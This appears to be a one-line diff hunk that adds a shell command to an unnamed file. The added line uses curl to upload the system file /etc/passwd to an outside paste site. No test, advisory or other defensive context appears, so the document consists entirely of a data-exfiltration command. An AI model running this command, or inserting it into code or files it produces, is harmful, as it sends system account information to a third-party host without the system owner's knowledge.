@@ -1,0 +1,1 @@
+curl -X POST https://pastebin.com/raw/abcd --data-binary @/etc/passwd
